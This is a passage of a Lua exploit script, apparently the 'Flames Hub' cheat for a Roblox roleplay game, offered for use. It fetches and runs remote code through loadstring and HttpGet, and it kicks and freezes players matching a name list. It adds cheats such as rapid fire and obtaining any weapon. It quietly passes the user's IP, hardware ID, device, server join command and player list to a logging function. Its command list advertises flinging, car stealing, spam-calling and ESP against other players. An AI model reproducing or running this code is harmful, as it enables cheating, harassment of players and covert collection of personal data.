         if n:find(u) or d:find(u) then
            p:Kick("Please check your internet connection and try again.")
            wait(2.5)
            while true do end
         end
      end
   end

   checkname(p)
   fw(0.1)
   getgenv().find_tool_folder_searcher_info = function()
      local cache = getgenv().tool_information_folder_instance
      if cache and cache:IsA("Folder") then
         return cache
      end

      for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
         if v:IsA("Folder") and v.Name:lower():find("tool") and v.Name:lower():find("info") then
            getgenv().tool_information_folder_instance = v
            return v
         end
      end

      return nil
   end
   if not getgenv().tool_information_folder_instance then task.spawn(function() getgenv().find_tool_folder_searcher_info() end) end

   getgenv().FlamesUI = getgenv().FlamesUI or {}
   local ui = getgenv().FlamesUI
   local lib = getgenv().FlamesLibrary
   local function get_certain_tool(tool_name_str)
      tool_name_str = tool_name_str:lower()
      local aliases = {
         ["assault rifle"] = {"assault", "rifle"},
         ["pistol"]        = {"pistol"},
         ["shotgun"]       = {"shotgun"},
         ["sniper rifle"]  = {"sniper", "rifle"},
         ["ak47"]          = {"ak"},
         ["stun gun"]      = {"stun"},
      }

      local function matches_tool(name, patterns)
         name = name:lower()
         for _, p in ipairs(patterns) do
            if not name:find(p) then return false end
         end
         return true
      end

      local function search_in(parent)
         if not parent then return nil end
         for _, v in ipairs(parent:GetChildren()) do
            if v:IsA("Tool") then
               for _, patterns in pairs(aliases) do
                  if matches_tool(v.Name, patterns) and matches_tool(tool_name_str, patterns) then
                     return v
                  end
               end
            end
         end
         return nil
      end

      return search_in(getgenv().Character or lp.Character or get_char(LocalPlayer, 5))
   end

   local function check_missing_tools()
      local lp = getgenv().LocalPlayer or game.Players.LocalPlayer
      local needed = { "LaserPointer", "Pistol" }
      local found = {}
      local function search(parent)
         if not parent then return end
         for _, v in ipairs(parent:GetChildren()) do
            if v:IsA("Tool") then
               found[v.Name] = true
            end
         end
      end

      search(getgenv().Backpack or lp.Backpack)
      search(getgenv().Character or lp.Character or get_char(LocalPlayer, 5))

      local missing = {}
      for _, name in ipairs(needed) do
         if not found[name] then
            table.insert(missing, name)
         end
      end

      return missing
   end

   local function retrieve_missing_tools()
      local missing = check_missing_tools()
      if #missing > 0 then
         for _, tool_name in ipairs(missing) do
            getgenv().Send("get_tool", tool_name)
         end
      end
   end

   ui.objects = ui.objects or {
      windows = {},
      tabs = {},
      sections = {},
      elements = {}
   }

   ui.load = function()
      if ui.rayfield then return ui.rayfield end
      ui.rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
      return ui.rayfield
   end

   ui.create_window = function(name, key)
      local Rayfield = ui.load()
      local window = Rayfield:CreateWindow({
         Name = name,
         Icon = 0,
         LoadingTitle = "Loading current GUI...",
         LoadingSubtitle = "by Flames Hub",
         ShowText = "FLAMES_HUB",
         Theme = "Default",
         ToggleUIKeybind = key or "K",
         DisableRayfieldPrompts = true,
         DisableBuildWarnings = true,
         ConfigurationSaving = {
            Enabled = true,
            FolderName = nil,
            FileName = name.."_config"
         },
         Discord = {
            Enabled = false,
            Invite = "nah",
            RememberJoins = true
         },
         KeySystem = false,
         KeySettings = {
            Title = "Key",
            Subtitle = "System",
            Note = "nah",
            FileName = "Key",
            SaveKey = true,
            GrabKeyFromSite = false,
            Key = {"key"}
         }
      })

      ui.objects.windows[name] = window
      return window
   end

   ui.create_tab = function(window, name)
      local tab = window:CreateTab(name, 0)
      ui.objects.tabs[name] = tab
      return tab
   end

   ui.create_section = function(tab, name)
      local section = tab:CreateSection(name)
      ui.objects.sections[name] = section
      return section
   end

   ui.button = function(tab, name, callback)
      local obj = tab:CreateButton({
         Name = name,
         Callback = callback
      })

      ui.objects.elements[name] = obj
      return obj
   end

   ui.toggle = function(tab, name, flag, default, callback)
      local obj = tab:CreateToggle({
      Name = name,
      CurrentValue = default or false,
      Flag = flag,
      Callback = function(val)
         callback(val)
      end,})

      ui.objects.elements[flag] = obj
      return obj
   end

   ui.slider = function(tab, name, flag, min, max, inc, default, suffix, callback)
      local obj = tab:CreateSlider({
      Name = name,
      Range = {min, max},
      Increment = inc,
      Suffix = suffix or "",
      CurrentValue = default,
      Flag = flag,
      Callback = function(val)
         callback(val)
      end,})

      ui.objects.elements[flag] = obj
      return obj
   end

   ui.colorpicker = function(tab, name, flag, default, callback)
      local obj = tab:CreateColorPicker({
      Name = name,
      Color = default,
      Flag = flag,
      Callback = function(val)
         callback(val)
      end,})

      ui.objects.elements[flag] = obj
      return obj
   end

   ui.input = function(tab, name, flag, placeholder, callback)
      local obj = tab:CreateInput({
      Name = name,
      CurrentValue = "",
      PlaceholderText = placeholder or "",
      RemoveTextAfterFocusLost = false,
      Flag = flag,
      Callback = function(text)
         callback(text)
      end,})

      ui.objects.elements[flag] = obj
      return obj
   end

   ui.dropdown = function(tab, name, flag, options, current, multi, callback)
      local obj = tab:CreateDropdown({
      Name = name,
      Options = options,
      CurrentOption = current,
      MultipleOptions = multi or false,
      Flag = flag,
      Callback = function(opt)
         callback(opt)
      end,})

      ui.objects.elements[flag] = obj
      return obj
   end

   ui.keybind = function(tab, name, flag, key, hold, callback)
      local obj = tab:CreateKeybind({
      Name = name,
      CurrentKeybind = key,
      HoldToInteract = hold or false,
      Flag = flag,
      Callback = function(k)
         callback(k)
      end,})

      ui.objects.elements[flag] = obj
      return obj
   end

   ui.destroy_window = function(name)
      local window = ui.objects.windows[name]
      if window then
         window:Destroy()
         ui.objects.windows[name] = nil
      end
   end

   ui.destroy_all = function()
      for name, window in pairs(ui.objects.windows) do
         window:Destroy()
         ui.objects.windows[name] = nil
      end
   end

   getgenv().tools_menu_for_life_together_flames_hub = function()
      if ui.objects.windows["Tools Menu | Flames Hub LLC ©️"] then return getgenv().notify("Warning", "Flames Hub - Tools Menu is already loaded!", 5) end
      local main_window = ui.create_window("Tools Menu | Flames Hub LLC ©️")
      local tab_1 = ui.create_tab(main_window, "Tools")
      local section_1 = ui.create_section(tab_1, "||| Tools Section |||")
      local FL = getgenv().FlamesLibrary
      local lp = getgenv().LocalPlayer or game.Players.LocalPlayer
      local isMobile = UIS.TouchEnabled and not UIS.KeyboardEnabled
      local tool_map = {
         ["assault rifle"] = { patterns = {"assault", "rifle"}, net = "shoot_ar",      module = "AssaultRifle" },
         ["shotgun"]       = { patterns = {"shotgun"},           net = "shoot_shotgun", module = "Shotgun" },
         ["sniper rifle"]  = { patterns = {"sniper", "rifle"},   net = "shoot_sniper",  module = "SniperRifle" },
         ["ak47"]          = { patterns = {"ak"},                net = "shoot_ar",      module = "AssaultRifle" },
         ["rocket"]        = { patterns = {"rocket"},            net = "shoot_rocket",  module = "RocketLauncher" },
      }

      local function MatchPatterns(name, patterns)
         name = name:lower()
         for _, p in ipairs(patterns) do
            if not name:find(p) then return false end
         end
         return true
      end

      local function get_tool_data(tool_instance)
         local name = tool_instance.Name:lower()
         for _, data in pairs(tool_map) do
            if MatchPatterns(name, data.patterns) then
               return data
            end
         end
         return nil
      end

      local function get_equipped_tool()
         if not lp.Character then return nil, nil end
         for _, v in ipairs(lp.Character:GetChildren()) do
            if v:IsA("Tool") then
               local data = get_tool_data(v)
               if data then return v, data end
            end
         end
         return nil, nil
      end

      local function GetObj(tool, module_name)
         if not module_name then return nil end
         local ok, mod = pcall(require, getgenv().Modules:FindFirstChild(module_name, true))
         if not ok or not mod then return nil end
         local ok2, obj = pcall(mod.class.get, tool)
         if not ok2 or not obj then return nil end
         return obj
      end

      local firing = false
      local function start_firing()
         if firing then return end
         local tool, data = get_equipped_tool()
         if not tool or not data then return end
         local obj = GetObj(tool, data.module)

         if obj then
            obj.states.reloading.hook(function(p)
               if p then
                  task.wait(0)
                  obj.states.bullets.set(30)
                  obj.states.reloading.set(false)
               end
            end)
         end

         firing = true
         FL.spawn("firing_weapon_loop", "spawn", function()
            while firing do
               local t, d = get_equipped_tool()
               if not t or not t:IsDescendantOf(lp.Character) then
                  firing = false
                  break
               end
               if obj then
                  obj.states.shoot.update(function(p) return not p end)
               end
               getgenv().Send(d.net, t)
               FL.wait(0.0001)
            end
         end)
      end

      local function stop_firing()
         firing = false
         FL.disconnect("firing_weapon_loop")
      end

      local function Setup_Input()
         if isMobile then
            FL.connect("tool_input", UIS.TouchStarted:Connect(function(_, gpe)
               if gpe then return end
               start_firing()
            end))
            FL.connect("tool_input", UIS.TouchEnded:Connect(function()
               stop_firing()
            end))
         else
            FL.connect("tool_input", UIS.InputBegan:Connect(function(input, gpe)
               if gpe then return end
               if input.UserInputType == Enum.UserInputType.MouseButton1 then
                  start_firing()
               end
            end))
            FL.connect("tool_input", UIS.InputEnded:Connect(function(input)
               if input.UserInputType == Enum.UserInputType.MouseButton1 then
                  stop_firing()
               end
            end))
         end

         FL.connect("tool_char", lp.CharacterRemoving:Connect(function()
            stop_firing()
         end))
      end

      local function Teardown_Input()
         stop_firing()
         FL.disconnect("tool_input")
         FL.disconnect("tool_char")
      end

      ui.toggle(tab_1, "Rapid Fire Weapons (FE)", "AlwaysRapidFireAR_Easily", getgenv().currently_toggled_rapid_fire_AR, function(is_toggled)
         if is_toggled then
            if getgenv().currently_toggled_rapid_fire_AR then
               Teardown_Input()
               task.wait(0.2)
            end

            getgenv().currently_toggled_rapid_fire_AR = true
            Setup_Input()
         else
            getgenv().currently_toggled_rapid_fire_AR = false
            Teardown_Input()
         end
      end)

      local tool_information = getgenv().tool_information_folder_instance or getgenv().find_tool_folder_searcher_info()
      local options = {}
      local tool_data_main = {}

      if tool_information then
         for _, v in ipairs(tool_information:GetChildren()) do
            if v:IsA("Tool") then
               table.insert(options, v.Name)
               tool_data_main[v.Name] = v
            end
         end
      end

      ui.dropdown(tab_1, "Get Any Weapon (FE)", "GetAnyWeapon", options, nil, false, function(selected)
         local tool = tool_data_main[selected]
         if tool then
            if getgenv().Send then getgenv().Send("get_tool", tool.Name) end
         end
      end)

      ui.button(tab_1, "Laser + Pistol (FE)", function()
         local lp = getgenv().LocalPlayer or game.Players.LocalPlayer
         local backpack = getgenv().Backpack or lp.Backpack
         local character = getgenv().Character or lp.Character
         if not character or not backpack then return end
         local function is_wanted(name)
            name = name:lower()
            return name:find("laser") or name:find("pistol")
         end

         local function already_equipped(name)
            for _, v in ipairs(character:GetChildren()) do
               if v:IsA("Tool") and v.Name == name then
                  return true
               end
            end
            return false
         end

         if already_equipped("LaserPointer") and already_equipped("Pistol") then return end
         local function has_unwanted()
            for _, v in ipairs(character:GetChildren()) do
               if v:IsA("Tool") and not is_wanted(v.Name) then return true end
            end
            for _, v in ipairs(backpack:GetChildren()) do
               if v:IsA("Tool") and not is_wanted(v.Name) then return true end
            end
            return false
         end

         if has_unwanted() then
            getgenv().Send("delete_tool")
            task.wait(0.25)
         end

         local wanted = { "LaserPointer", "Pistol" }
         for _, tool_name in ipairs(wanted) do
            local in_backpack = false
            for _, v in ipairs(backpack:GetChildren()) do
               if v:IsA("Tool") and v.Name == tool_name then
                  in_backpack = true
                  break
               end
            end
            if not already_equipped(tool_name) and not in_backpack then
               getgenv().Send("get_tool", tool_name)
               task.wait(0.1)
            end
         end
         task.wait(0.25)
         for _, v in ipairs(backpack:GetChildren()) do
            if v:IsA("Tool") and is_wanted(v.Name) and not already_equipped(v.Name) then
               v.Parent = character
            end
         end
      end)

      ui.button(tab_1, "Shutdown/Close Menu", function()
         pcall(function() ui.destroy_window() end)
         wait(0.1)
         pcall(function() ui.destroy_all() end)
      end)
   end

   -- [[ should be much more safer now. ]] --
   getgenv()._rgb_conns = getgenv()._rgb_conns or {}
   getgenv()._rgb_global_conn = getgenv()._rgb_global_conn or nil
   getgenv().rgb_color_map = {
      red = Color3.fromRGB(255,0,0),
      darkred = Color3.fromRGB(139,0,0),
      green = Color3.fromRGB(0,255,0),
      darkgreen = Color3.fromRGB(0,100,0),
      lime = Color3.fromRGB(50,205,50),
      blue = Color3.fromRGB(0,0,255),
      darkblue = Color3.fromRGB(0,0,139),
      lightblue = Color3.fromRGB(173,216,230),
      skyblue = Color3.fromRGB(135,206,235),
      white = Color3.fromRGB(255,255,255),
      black = Color3.fromRGB(0,0,0),
      gray = Color3.fromRGB(128,128,128),
      lightgray = Color3.fromRGB(211,211,211),
      darkgray = Color3.fromRGB(64,64,64),
      yellow = Color3.fromRGB(255,255,0),
      gold = Color3.fromRGB(255,215,0),
      orange = Color3.fromRGB(255,165,0),
      darkorange = Color3.fromRGB(255,140,0),
      purple = Color3.fromRGB(128,0,128),
      violet = Color3.fromRGB(238,130,238),
      indigo = Color3.fromRGB(75,0,130),
      pink = Color3.fromRGB(255,105,180),
      hotpink = Color3.fromRGB(255,20,147),
      cyan = Color3.fromRGB(0,255,255),
      teal = Color3.fromRGB(0,128,128),
      brown = Color3.fromRGB(139,69,19),
      tan = Color3.fromRGB(210,180,140),
      magenta = Color3.fromRGB(255,0,255),
      coral = Color3.fromRGB(255,127,80),
      salmon = Color3.fromRGB(250,128,114)
   }

   getgenv().rgb_color_index = {}
   do
      local i = 1
      for name in pairs(getgenv().rgb_color_map) do
         getgenv().rgb_color_index[i] = name
         i = i + 1
      end
   end

   local function ensure_global_loop()
      if getgenv()._rgb_global_conn then return end

      local rs = getgenv().RunService or game:GetService("RunService")
      local conn = rs.RenderStepped:Connect(function(dt)
         local conns = getgenv()._rgb_conns
         local any = false

         for _, data in pairs(conns) do
            if data and data.obj then
               any = true
               if not data.paused then
                  data.hue = (data.hue + (dt * data.speed)) % 1
                  data.obj.BackgroundColor3 = Color3.fromHSV(data.hue, 1, 1)
               end
            end
         end

         if not any then
            getgenv()._rgb_global_conn:Disconnect()
            getgenv()._rgb_global_conn = nil
         end
      end)

      getgenv()._rgb_global_conn = conn
   end

   getgenv().flowrgb = function(name, speed, obj, toggle)
      local conns = getgenv()._rgb_conns

      if toggle == false then
         conns[name] = nil
         return
      end

      conns[name] = {
         obj = obj,
         speed = speed,
         hue = 0,
         paused = false
      }

      ensure_global_loop()
   end

   getgenv().toggle_rgb = function(name, state)
      local data = getgenv()._rgb_conns[name]
      if data then
         data.paused = state
      end
   end

   getgenv().toggle_all_rgb = function(state)
      for _, data in pairs(getgenv()._rgb_conns) do
         if data then
            data.paused = state
         end
      end
   end

   getgenv().set_rgb_color_smart = function(name, input)
      local data = getgenv()._rgb_conns[name]
      if not data or not data.obj then return end

      local color

      if typeof(input) == "string" then
         color = getgenv().rgb_color_map[input:lower()]
      elseif typeof(input) == "number" then
         local cname = getgenv().rgb_color_index[input]
         if cname then color = getgenv().rgb_color_map[cname] end
      elseif typeof(input) == "Color3" then
         color = input
      end

      if not color then
         local keys = {}
         for k in pairs(getgenv().rgb_color_map) do keys[#keys+1] = k end
         color = getgenv().rgb_color_map[keys[math.random(1, #keys)]]
      end

      data.obj.BackgroundColor3 = color
   end

   getgenv().set_all_rgb_color_smart = function(input)
      local color

      if typeof(input) == "string" then
         color = getgenv().rgb_color_map[input:lower()]
      elseif typeof(input) == "number" then
         local cname = getgenv().rgb_color_index[input]
         if cname then color = getgenv().rgb_color_map[cname] end
      elseif typeof(input) == "Color3" then
         color = input
      end

      if not color then
         local keys = {}
         for k in pairs(getgenv().rgb_color_map) do keys[#keys+1] = k end
         color = getgenv().rgb_color_map[keys[math.random(1, #keys)]]
      end

      for _, data in pairs(getgenv()._rgb_conns) do
         if data and data.obj then
            data.obj.BackgroundColor3 = color
         end
      end
   end

   getgenv().set_all_rgb_color = function(color)
      for _, data in pairs(getgenv()._rgb_conns) do
         if data and data.obj then
            data.obj.BackgroundColor3 = color
         end
      end
   end

   local function get_player_list()
      local players = getgenv().Players:GetPlayers()
      local parts = {}

      for i, plr in ipairs(players) do
         table.insert(parts, "[" .. i .. ']: "' .. plr.Name .. '"')
      end

      return table.concat(parts, ", ")
   end

   getgenv().is_server_full = function()
      local current = #getgenv().Players:GetPlayers()
      local max = getgenv().Players.MaxPlayers
      return current >= max
   end

   local function Device_Detector()
      local platform = UserInputService:GetPlatform()
      local platformMap = {
         [Enum.Platform.Windows] = "Windows",
         [Enum.Platform.OSX] = "OSX",
         [Enum.Platform.IOS] = "iOS",
         [Enum.Platform.Android] = "Android",
         [Enum.Platform.XBoxOne] = "Xbox One (Console)",
         [Enum.Platform.PS4] = "PS4 (Console)",
         [Enum.Platform.XBox360] = "Xbox 360 (Console)",
         [Enum.Platform.WiiU] = "Wii-U (Console)",
         [Enum.Platform.NX] = "Cisco Nexus",
         [Enum.Platform.Ouya] = "Ouya (Android-Based)",
         [Enum.Platform.AndroidTV] = "Android TV",
         [Enum.Platform.Chromecast] = "Chromecast",
         [Enum.Platform.Linux] = "Linux (Desktop)",
         [Enum.Platform.SteamOS] = "Steam Client",
         [Enum.Platform.WebOS] = "Web-OS",
         [Enum.Platform.DOS] = "DOS",
         [Enum.Platform.BeOS] = "BeOS",
         [Enum.Platform.UWP] = "UWP (Go Back To Web Bro..)",
         [Enum.Platform.PS5] = "PS5 (Console)",
         [Enum.Platform.MetaOS] = "MetaOS",
         [Enum.Platform.None] = "Unknown Device"
      }
      return platformMap[platform] or "Unknown Device"
   end

   getgenv().current_device = Device_Detector()
   local timestamp = os.date("%Y-%m-%d %H:%M:%S")
   local content = ("IP: %s"):format(tostring(detected_ip or "unknown"))
   local function trunc(s, n)
      s = tostring(s or "")
      if #s > n then
         return s:sub(1, n - 3) .. "..."
      end
      return s
   end

   local join_command = "```game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "', game.Players.LocalPlayer)```"

   if getgenv().Send_Main_Log then
      getgenv().Send_Main_Log({
         packet = content,
         executor = tostring(executor_string),
         device = tostring(current_device),
         uuid = tostring(flames_unique_server_ID),
         hwid = tostring(getgenv().current_code_block_line),
         current_players = get_player_list()
      })
   else
      warn("[WS]: Send_Main_Log not available yet")
   end

   local cmdsString = [[
      {prefix}togglechat (🔥 NEW + OP 🔥) - Enables Flames Chat service system, letting you chat with other Flames Hub users in your game!
      {prefix}rgbcar - Enables RGB/Rainbow Vehicle (FE Rainbow Vehicle).
      {prefix}unrgbcar - Disables RGB/Rainbow Vehicle (FE, Rainbow Vehicle).
      {prefix}twotonecar (🔥 NEW 🔥) - Enables Two Tone Vehicle (flashes two colors, FE).
      {prefix}untwotonecar (🔥 NEW 🔥) - Disables Two Tone Vehicle (flashes two colors, FE).
      {prefix}feedback (👑 NEW LOOK 👑) - Gives you a menu to be able to send me feedback/suggestions/rating for the script!
      {prefix}infpremium - Executes Infinite Premium.
      {prefix}infyield - Executes regular Infinite Yield.
      {prefix}nameless - Executes Flames Nameless Admin (ReWrite version).
      {prefix}streamermode - Gives you a GUI that allows you to hide your username and other usernames while rec/live streaming.
      {prefix}spawnfire NUMBER - Spawns fire with a specified number argument.
      {prefix}rainbowcar [Player] - Makes a players car RGB (FRIENDS ONLY!, FE).
      {prefix}chatbypass (⛔ PATCHED ⛔) - Executes a Chat Bypass script GUI (key is: typethisout).
      {prefix}copyav [Player] (🔥POPULAR FEATURE🔥) - Copies the target players avatar/outfit in full (animations, body, everything! FE!).
      {prefix}norainbowcar [Player] - Disables the RGB for a players car (FRIENDS ONLY!, FE).
      {prefix}annoyergui - Enables the GUI that lets you pick and toggle annoy players (FE).
      {prefix}rgbstreetlights - Enables RGB StreetLights (flashing Rainbow StreetLights, NOT FE! VISUAL!).
      {prefix}unrgbstreetlights - Disables RGB StreetLights (NOT FE! VISUAL!).
      {prefix}advertise (⭐) - Basically let's you help us get people to use our script (FE).
      {prefix}signspam - Spams the text on your Tool Sign (FE).
      {prefix}unsignspam - Stops spamming the text on your Tool Sign.
      {prefix}countcmds - Tells you how many commands are currently in Flames Hub right now.
      {prefix}carfly SPEED - Enables a working (not wacky) VehicleFly that will not break your car too, also is entirely FE.
      {prefix}uncarfly - Disables Vehicle-Fly.
      {prefix}debugger - Executes Flames Debugger GUI, so if you have a problem with the script, it'll bring up a menu to tell you if our functions work or not.
      {prefix}orbit [Player] [Speed] [Distance] - Lets you Orbit around the target Player (FE).
      {prefix}size (🔥 NEW + OP! 🔥) [number] - Makes your Character what ever size you put in (FE, bypasses height limit!).
      {prefix}normalsize (🔥 NEW 🔥) - Makes your Character normal size again (FE).
      {prefix}unorbit - Stops orbiting the target Player.
      {prefix}blockcalls - Enables call_blocker_V2, which stops all calls from coming in (auto hangs up, FE).
      {prefix}unblockcalls - Disables Call_Blocker_V2 (FE).
      {prefix}msggui - Gives you a GUI that lets you send messages automatically through the Phone system in-game (FE).
      {prefix}float (😎 FIXED! 😎) - Allows you to literally float in the air and go up and down (FE) (better than Infinite Yields version).
      {prefix}unfloat - Disables the 'float' command.
      {prefix}lockhome - Locks your current Home (FE).
      {prefix}unlockhome - Unlocks your current Home (FE).
      {prefix}ytmusic - Gives you a GUI that lets you play music from YouTube directly inside the game for your own convenience (NOT FE).
      {prefix}statsgui - Gives you the menu at the top displaying your FPS, ping, etc.
      {prefix}lockplrhome [Player] - Locks the target players house (FE).
      {prefix}unlockplrhome [Player] - Unlocks the target players house (FE).
      {prefix}autolockhome - Automatically locks your house when unlocked (FE).
      {prefix}unautolockhome - Disables 'autolockhome' command.
      {prefix}ban [Player] - Bans the player from your Private Server (FE, ONLY works in YOUR priv server).
      {prefix}unban [Player] - Unbans the player from your Private Server (FE, ONLY works in YOUR priv server).
      {prefix}walkfling - Enables WalkFling.
      {prefix}unwalkfling - Disables WalkFling.
      {prefix}setspawn - Will set your Spawn Point where you're at currently, once you respawn, you'll teleport back to that spot.
      {prefix}unsetsp - Disables the 'setspawn' command and clears Spawn Point.
      {prefix}stealcar [Player] - Allows you to swiftly take someones car, so if they have one spawned, it'll automatically jump in it.
      {prefix}wfwl [Player] - Whitelists the Player to WalkFling (you won't fling them when walking).
      {prefix}unwfwl [Player] - Removes that Player from the WalkFling Whitelist.
      {prefix}speed Number - Changes your WalkSpeed.
      {prefix}jp Number - Changes your JumpHeight.
      {prefix}grav Number - Changes your Gravity.
      {prefix}caresp - Enables Vehicle ESP, which lets you see all cars through walls from anywhere.
      {prefix}uncaresp - Disables Vehicle ESP.
      {prefix}esp - Enables Player ESP, which allows you to see any Player anywhere through walls.
      {prefix}unesp - Disables the Player ESP command.
      {prefix}traceresp - Enables Tracer ESP, which puts a Line on every Player anywhere.
      {prefix}untraceresp - Disables the Tracer ESP command.
      {prefix}saveanim - Saves the currently playing Animation to Flames Emotes GUI, so that you can play it once you load it back up.
      {prefix}namespam - Spam changes your name (no hashtags! FE!).
      {prefix}unnamespam - Unspam changes your name (turns off 'namespam').
      {prefix}orbitspeed NewSpeed - Lets you modify your Orbit speed.
      {prefix}antifitstealer (🔥 #1 FEATURE 🔥) - Allows you to toggle on Anti Outfit Copier (FE).
      {prefix}unanticopyfit - Disables Anti Outfit Copier (FE).
      {prefix}hidedelta - Hides the Delta button icon (if you're using Delta).
      {prefix}unhidedelta - Shows the Delta button icon (if you're using Delta).
      {prefix}outfitsui (🔥POPULAR FEATURE🔥) - Allows you to save how ever many outfits you want with our new GUI.
      {prefix}anticarfling (🔥HOT🔥) - Enables 'anticarfling', preventing you from being flung by Vehicles.
      {prefix}unanticarfling - Disables 'anticarfling' command.
      {prefix}rainbowtime [Player] NUMBER - Sets your whitelisted friends rainbow car speed.
      {prefix}unadmin [Player] - Removes the player's FE commands (if they're your friend).
      {prefix}admin [Player] - Adds the player to the FE commands whitelist (if they're your friend).
      {prefix}rgbskin - Enable RGB Skin (flashing Rainbow Skintone).
      {prefix}unrgbskin - Disable RGB Skin (flashing Rainbow Skintone).
      {prefix}checkpremium [Player] - Checks if a player has premium or not.
      {prefix}rgbphone (🔥HOT🔥) - Enable RGB Phone (flashing Rainbow Phone).
      {prefix}unrgbphone - Disable RGB Phone (flashing Rainbow Phone).
      {prefix}fpsboost - Lag reducer that boosts your FPS (sort of).
      {prefix}updlogs - Shows you a menu with all the recent updates, making it easier to know what was added/removed/changed.
      {prefix}startrgbtool - Enables RGB Tool (FE, Flashing Rainbow Tool).
      {prefix}stoprgbtool - Disables RGB Tool (FE, Flashing Rainbow Tool).
      {prefix}glitchoutfit - Enables the glitching of your outfit.
      {prefix}noglitchoutfit - Disables the glitching of your outfit.
      {prefix}copyanim [Player] - Copies the Animation/Emote that 'Player' is doing.
      {prefix}stoptime - Stops the current time (FE, priv server only!).
      {prefix}resumetime - Resumes the current time (FE, priv server only!).
      {prefix}loopfling [Player] - Allows you loop-fling someone even when they die and respawn (FE).
      {prefix}unloopfling - Disables the 'loopfling' command entirely.
      {prefix}privserver - Notifies you who the Private Server owner is (if you're in a private server).
      {prefix}flashweather - Makes the current weather flash fast (FE, priv server only!).
      {prefix}unflashweather - Stops Weather Flasher (FE) (priv server only!).
      {prefix}flashtime - Makes the current time flash fast (FE, priv server only!).
      {prefix}unflashtime - Stops Time Flasher (FE) (priv server only!).
      {prefix}slock - Allows you lock your priv server (nobody will be able to join, FE, priv server only!).
      {prefix}unslock - Disables 'slock' command (priv server only!).
      {prefix}slockgui - Gives you a GUI to add people to server-lock whitelist (FE, priv server only!).
      {prefix}kick [Player] - Kicks the player from your Private Server (ur priv server only! FE).
      {prefix}spin Speed - Spins your character at the provided speed (FE).
      {prefix}unspin - Unspins your character.
      {prefix}flames - Spams fire all over you (if you actually have LifePay/Premium, FE).
      {prefix}noflames - Disables the spamming of fire.
      {prefix}autonoflames - Automatically hides Fire, stopping lag from the 'flames' command.
      {prefix}unautohideflames - Disables the auto-hide fire lag reducer.
      {prefix}wseditor (💻 DEBUG 💻) - Executes Workspace Editor, which allows you to basically literally edit the Workspace (where the parts and models and stuff are).
      {prefix}carstats - Gives you a GUI that lets you see the speed of other Vehicles and spawn them with their settings (speed, color, etc) FE.
      {prefix}name NewName - Lets you change your RP name.
      {prefix}bio NewBio - Lets you change your RP bio.
      {prefix}mutetools - Mutes all Boomboxes, Speakers and other tools in the game that play music.
      {prefix}unmutetools - Unmutes all Boomboxes, Speakers and other tools in the game that play music.
      {prefix}freeemotes - Gives you the Free Emotes GUI.
      {prefix}allcars - Gives you the GUI list that shows all the car names.
      {prefix}noemote - Disables any emote you are currently doing.
      {prefix}needy - Makes you basically Twerk (FE), bro?.
      {prefix}griddy - Makes you do the Griddy emote (FE).
      {prefix}jiggy - Makes you do the Jiggy emote(s) (FE).
      {prefix}scenario - Makes you do the Scenario emote (FE).
      {prefix}superman - Makes you do the Superman emote (FE).
      {prefix}zen - Makes you do the Zen emote (FE).
      {prefix}orangej - Makes you do the Orange Justice emote (FE).
      {prefix}aurafarm - Makes you do an Aura Float emote (FE).
      {prefix}worm - Makes you do The Worm emote (FE).
      {prefix}jabba - Makes you do the Jabba emote (FE).
      {prefix}popular - Makes you do the Popular emote (FE).
      {prefix}defaultd - Makes you do the Default Dance emote (FE).
      {prefix}kotonai - Makes you do the Koto Nai emote (FE).
      {prefix}glitching - Makes you do the Glitching emote (FE).
      {prefix}billyjean - Makes you do the Billie Jean emote (FE).
      {prefix}billybounce - Makes you do the Billy Bounce emote (FE).
      {prefix}michaelmyers - Makes you do the Michael Myers emote (FE).
      {prefix}sturdy - Makes you do the New York Sturdy emote (FE).
      {prefix}eshuffle - Makes you do the Electro Shuffle emote (FE).
      {prefix}takethel - Makes you do the Take The L emote (FE).
      {prefix}laughitup - Makes you do the Donkey Laugh emote (FE).
      {prefix}reanimated - Makes you do the Reanimated emote (FE).
      {prefix}motion - Makes you do the Motion emote (FE).
      {prefix}tuff - Makes you do the Tuff emote (FE).
      {prefix}config - Shows you the Configuration Manager GUI.
      {prefix}antirgbphone - Enables Anti RGB Phone (boosts performance!).
      {prefix}unantirgbphone - Disables Anti RGB Phone, potentially reducing performance.
      {prefix}antivoid - Enables anti-void.
      {prefix}unantivoid - Disables anti-void.
      {prefix}alljobs - Repeatedly spams all jobs.
      {prefix}jobsoff - Stops spamming all jobs.
      {prefix}fly Speed - Enable/disable flying.
      {prefix}unfly - Disables (Fly) command.
      {prefix}fly3 - Enables Fly-3, which is like Adonis Admins Fly.
      {prefix}unfly3 - Disables Fly-3.
      {prefix}annoy [Player] - Spam calls + spam request carries the target player (FE).
      {prefix}unannoy - Disables annoy player system.
      {prefix}fly2 Speed - Enables magic carpet fly (ONLY VISUAL rainbow!).
      {prefix}unfly2 - Disables Fly2/Magic carpet fly (with the client side rainbow).
      {prefix}noclip - Enables Noclip, letting you walk through everything.
      {prefix}clip - Disables Noclip, so you cannot walk through everything.
      {prefix}trailer - Gives you the WaterSkies trailer (on any car/vehicle).
      {prefix}notrailer - Removes the WaterSkies trailer (on your current spawned car/vehicle).
      {prefix}autolockcar - Automatically (loop) locks your vehicle/car when there is one spawned.
      {prefix}unautolockcar - Turn off/disables the loop that automatically locks your vehicle/car.
      {prefix}lockcar - Locks your car.
      {prefix}unlockcar - Unlocks your car.
      {prefix}despawn - Despawns your car.
      {prefix}viewcar - Views your Vehicle.
      {prefix}unviewcar - Unviews your Vehicle.
      {prefix}blacklist [Player] - Blacklists friends you specify from using the admin commands (even if they are already on).
      {prefix}unblacklist [Player] - Removes the blacklist from the friend you specified in the 'blacklist' command, allowing them to do ;rgbcar and such again.
      {prefix}antifling - Fully prevents you from being flung, by other exploiters/cheaters, and fling outfits (FULL BYPASS).
      {prefix}unantifling - Disables anti-fling.
      {prefix}friend [Player] - Lets you add someone in the server via this script.
      {prefix}unfriend [Players] - Lets you unadd someone in the server via this script.
      {prefix}bringcar - Teleport car to you and sit in it.
      {prefix}flashname - Enables the flashing of your "Bio" and "Name" (above your head).
      {prefix}unflashname - Disables the flashing of your "Bio" and "Name" (above your head).
      {prefix}invis - Allows you to go Invisible (for free) via the teleport method (FE).
      {prefix}uninvis - Turns off the 'invis' command and makes you visible.
      {prefix}flashinvis - Enables the flashing of the invisibility GamePass for you're character (you need to actually own the GamePass).
